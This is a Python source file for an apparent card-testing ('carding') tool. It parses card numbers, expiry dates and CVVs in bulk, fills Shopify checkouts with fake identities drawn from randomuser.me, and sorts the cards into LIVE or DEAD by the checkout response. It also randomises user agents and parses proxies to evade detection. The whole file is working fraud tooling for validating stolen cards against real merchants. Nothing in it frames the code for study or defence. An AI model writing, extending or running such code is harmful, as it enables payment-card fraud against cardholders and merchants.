import asyncio
import aiohttp
import json
import random
import re
from typing import List, Dict, Any
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from database import Database
import logging

logger = logging.getLogger(__name__)

class CardChecker:
    def __init__(self):
        self.db = Database()
        self.ua = UserAgent()
        self.checking_status = {}
        
    async def get_fake_address(self) -> Dict:
        """Get fake address from API"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get('https://randomuser.me/api/') as response:
                    data = await response.json()
                    user = data['results'][0]
                    
                    return {
                        'first_name': user['name']['first'],
                        'last_name': user['name']['last'],
                        'address': user['location']['street']['name'],
                        'city': user['location']['city'],
                        'state': user['location']['state'],
                        'zip': user['location']['postcode'],
                        'country': user['location']['country'],
                        'phone': user['phone'],
                        'email': user['email']
                    }
        except Exception as e:
            logger.error(f"Error getting fake address: {e}")
            return {
                'first_name': 'John',
                'last_name': 'Doe',
                'address': '123 Main St',
                'city': 'New York',
                'state': 'NY',
                'zip': '10001',
                'country': 'United States',
                'phone': '555-0123',
                'email': 'john.doe@example.com'
            }
    
    def parse_card(self, card_string: str) -> Dict:
        """Parse card string into components"""
        parts = card_string.strip().split('|')
        if len(parts) >= 4:
            return {
                'number': parts[0],
                'month': parts[1],
                'year': parts[2],
                'cvv': parts[3],
                'holder': parts[4] if len(parts) > 4 else 'John Doe'
            }
        return None
    
    def parse_proxy(self, proxy_string: str) -> Dict:
        """Parse proxy string into components"""
        parts = proxy_string.strip().split(':')
        if len(parts) >= 4:
            return {
                'host': parts[0],
                'port': int(parts[1]),
                'username': parts[2],
                'password': parts[3]
            }
        return None
    
    async def create_session_with_proxy(self, proxy: Dict = None) -> aiohttp.ClientSession:
        """Create HTTP session with proxy if provided"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Create session without proxy for now (proxy support can be added later with aiohttp-socks)
        return aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(),
            headers=headers,
            timeout=aiohttp.ClientTimeout(total=30)
        )
    
    async def get_product_details(self, session: aiohttp.ClientSession, url: str) -> Dict:
        """Get product details from Shopify URL"""
        try:
            async with session.get(url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                # Extract product details
                product_data = {}
                
                # Find product form
                form = soup.find('form', {'action': re.compile(r'/cart/add')})
                if form:
                    variant_id = form.find('input', {'name': 'id'})
                    if variant_id:
                        product_data['variant_id'] = variant_id.get('value')
                
                # Get product title
                title_elem = soup.find('h1') or soup.find('title')
                if title_elem:
                    product_data['title'] = title_elem.get_text().strip()
                
                # Get price
                price_elem = soup.find(class_=re.compile(r'price'))
                if price_elem:
                    price_text = price_elem.get_text().strip()
                    price_match = re.search(r'[\d,]+\.?\d*', price_text)
                    if price_match:
                        product_data['price'] = float(price_match.group().replace(',', ''))
                
                return product_data
                
        except Exception as e:
            logger.error(f"Error getting product details: {e}")
            return {}
    
    async def add_to_cart(self, session: aiohttp.ClientSession, base_url: str, variant_id: str) -> bool:
        """Add product to cart"""
        try:
            cart_url = f"{base_url.split('/products')[0]}/cart/add.js"
            data = {
                'id': variant_id,
                'quantity': 1
            }
            
            async with session.post(cart_url, json=data) as response:
                return response.status == 200
                
        except Exception as e:
            logger.error(f"Error adding to cart: {e}")
            return False
    
    async def get_checkout_url(self, session: aiohttp.ClientSession, base_url: str) -> str:
        """Get checkout URL"""
        try:
            checkout_url = f"{base_url.split('/products')[0]}/checkout"
            return checkout_url
        except Exception as e:
            logger.error(f"Error getting checkout URL: {e}")
            return ""
    
    async def process_checkout(self, session: aiohttp.ClientSession, checkout_url: str, 
                             card: Dict, address: Dict) -> Dict:
        """Process checkout with card details"""
        try:
            # Get checkout page
            async with session.get(checkout_url) as response:
                html = await response.text()
                soup = BeautifulSoup(html, 'html.parser')
                
                # Find checkout form
                form = soup.find('form')
                if not form:
                    return {"status": "ERROR", "message": "No checkout form found"}
                
                # Extract form data
                form_data = {}
                for input_elem in form.find_all('input'):
                    name = input_elem.get('name')
                    value = input_elem.get('value', '')
                    if name:
                        form_data[name] = value
                
                # Fill in address details
                address_fields = {
                    'checkout[shipping_address][first_name]': address['first_name'],
                    'checkout[shipping_address][last_name]': address['last_name'],
                    'checkout[shipping_address][address1]': address['address'],
                    'checkout[shipping_address][city]': address['city'],
                    'checkout[shipping_address][province]': address['state'],
                    'checkout[shipping_address][zip]': str(address['zip']),
                    'checkout[shipping_address][country]': address['country'],
                    'checkout[shipping_address][phone]': address['phone'],
                    'checkout[email]': address['email'],
                    'checkout[billing_address][first_name]': address['first_name'],
                    'checkout[billing_address][last_name]': address['last_name'],
                    'checkout[billing_address][address1]': address['address'],
                    'checkout[billing_address][city]': address['city'],
                    'checkout[billing_address][province]': address['state'],
                    'checkout[billing_address][zip]': str(address['zip']),
                    'checkout[billing_address][country]': address['country'],
                    'checkout[billing_address][phone]': address['phone'],
                }
                
                # Fill in card details
                card_fields = {
                    'checkout[credit_card][number]': card['number'],
                    'checkout[credit_card][month]': card['month'],
                    'checkout[credit_card][year]': card['year'],
                    'checkout[credit_card][verification_value]': card['cvv'],
                    'checkout[credit_card][name]': card['holder'],
                }
                
                form_data.update(address_fields)
                form_data.update(card_fields)
                
                # Submit checkout
                action = form.get('action', checkout_url)
                if not action.startswith('http'):
                    base = checkout_url.split('/checkout')[0]
                    action = base + action
                
                async with session.post(action, data=form_data) as response:
                    result_html = await response.text()
                    result_lower = result_html.lower()
                    
                    # Check for specific error patterns
                    if 'card_declined' in result_lower or 'your card was declined' in result_lower:
                        return {"status": "DEAD", "message": "Card declined by issuer"}
                    elif 'insufficient_funds' in result_lower or 'insufficient funds' in result_lower:
                        return {"status": "DEAD", "message": "Insufficient funds"}
                    elif 'invalid_number' in result_lower or 'invalid card number' in result_lower:
                        return {"status": "DEAD", "message": "Invalid card number"}
                    elif 'invalid_expiry' in result_lower or 'invalid expiry date' in result_lower:
                        return {"status": "DEAD", "message": "Invalid expiry date"}
                    elif 'invalid_cvc' in result_lower or 'invalid security code' in result_lower:
                        return {"status": "DEAD", "message": "Invalid CVC/CVV"}
                    elif 'expired_card' in result_lower or 'card has expired' in result_lower:
                        return {"status": "DEAD", "message": "Card expired"}
                    elif 'processing_error' in result_lower or 'payment processing error' in result_lower:
                        return {"status": "ERROR", "message": "Payment processing error"}
                    elif 'thank you' in result_lower or 'order confirmed' in result_lower or 'payment successful' in result_lower:
                        return {"status": "LIVE", "message": "Payment successful - Card is live!"}
                    elif 'declined' in result_lower:
                        return {"status": "DEAD", "message": "Card declined"}
                    elif 'error' in result_lower:
                        return {"status": "ERROR", "message": "Checkout error occurred"}
                    elif response.status == 422:
                        return {"status": "DEAD", "message": "Payment validation failed"}
                    elif response.status >= 400:
                        return {"status": "ERROR", "message": f"HTTP error {response.status}"}
                    else:
                        # Default to DEAD if unclear
                        return {"status": "DEAD", "message": "Payment failed - Unknown reason"}
                        
        except asyncio.TimeoutError:
            return {"status": "ERROR", "message": "Request timeout"}
        except aiohttp.ClientError as e:
            return {"status": "ERROR", "message": f"Network error: {str(e)}"}
        except Exception as e:
            logger.error(f"Error processing checkout: {e}")
            return {"status": "ERROR", "message": f"Checkout error: {str(e)}"}
    
    async def check_single_card(self, user_id: int, card_string: str, shopify_url: str, 
                               proxy: Dict = None) -> Dict:
        """Check a single card"""
        card = self.parse_card(card_string)
        if not card:
            return {
                'card': card_string,
                'status': 'ERROR',
                'message': 'Invalid card format'
            }
        
        try:
            session = await self.create_session_with_proxy(proxy)
            
            # Get fake address
            address = await self.get_fake_address()
            
            # Get product details
            product_details = await self.get_product_details(session, shopify_url)
            if not product_details.get('variant_id'):
                await session.close()
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': 'Could not find product variant'
                }
            
            # Add to cart
            if not await self.add_to_cart(session, shopify_url, product_details['variant_id']):
                await session.close()
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': 'Could not add to cart'
                }
            
            # Get checkout URL
            checkout_url = await self.get_checkout_url(session, shopify_url)
            if not checkout_url:
                await session.close()
                return {
                    'card': card_string,
                    'status': 'ERROR',
                    'message': 'Could not get checkout URL'
                }
            
            # Process checkout
            result = await self.process_checkout(session, checkout_url, card, address)
            
            await session.close()
            
            return {
                'card': card_string,
                'status': result['status'],
                'message': result['message']
            }
            
        except Exception as e:
            logger.error(f"Error checking card {card_string}: {e}")
            return {
                'card': card_string,
                'status': 'ERROR',
                'message': str(e)
            }
    
    async def check_cards(self, user_id: int, cards: List[str]) -> Dict:
        """Check multiple cards"""
        user_id_str = str(user_id)
        
        # Initialize checking status
        self.checking_status[user_id_str] = {
            'total': len(cards),
            'checked': 0,
            'live': 0,
            'dead': 0,
            'error': 0,
            'current_card': '',
            'previous_card': '',
            'results': {
                'LIVE': [],
                'DEAD': [],
                'ERROR': []
            },
            'is_running': True,
            'is_paused': False
        }
        
        # Get user's Shopify URLs and proxies
        shopify_urls = await self.db.get_shopify_urls(user_id)
        proxies = await self.db.get_proxies(user_id)
        
        if not shopify_urls:
            return {'error': 'No Shopify URLs configured'}
        
        # Use first URL as default
        shopify_url = shopify_urls[0]
        
        # Parse proxies
        parsed_proxies = []
        for proxy_str in proxies:
            proxy = self.parse_proxy(proxy_str)
            if proxy:
                parsed_proxies.append(proxy)
        
        # Check cards
        for i, card in enumerate(cards):
            if not self.checking_status[user_id_str]['is_running']:
                break
                
            while self.checking_status[user_id_str]['is_paused']:
                await asyncio.sleep(1)
            
            # Update current card
            self.checking_status[user_id_str]['current_card'] = card
            
            # Select random proxy if available
            proxy = random.choice(parsed_proxies) if parsed_proxies else None
            
            # Check card
            result = await self.check_single_card(user_id, card, shopify_url, proxy)
            
            # Update results
            status = result['status']
            self.checking_status[user_id_str]['results'][status].append(result)
            self.checking_status[user_id_str][status.lower()] += 1
            self.checking_status[user_id_str]['checked'] += 1
            self.checking_status[user_id_str]['previous_card'] = card
            
            # Small delay between checks
            await asyncio.sleep(1)
        
        self.checking_status[user_id_str]['is_running'] = False
        return self.checking_status[user_id_str]
    
    def get_checking_status(self, user_id: int) -> Dict:
        """Get current checking status"""
        user_id_str = str(user_id)
        return self.checking_status.get(user_id_str, {})
    
    def pause_checking(self, user_id: int):
        """Pause card checking"""
        user_id_str = str(user_id)
        if user_id_str in self.checking_status:
            self.checking_status[user_id_str]['is_paused'] = True
    
    def resume_checking(self, user_id: int):
        """Resume card checking"""
        user_id_str = str(user_id)
        if user_id_str in self.checking_status:
            self.checking_status[user_id_str]['is_paused'] = False
    
    def stop_checking(self, user_id: int):
        """Stop card checking"""
        user_id_str = str(user_id)
        if user_id_str in self.checking_status:
            self.checking_status[user_id_str]['is_running'] = False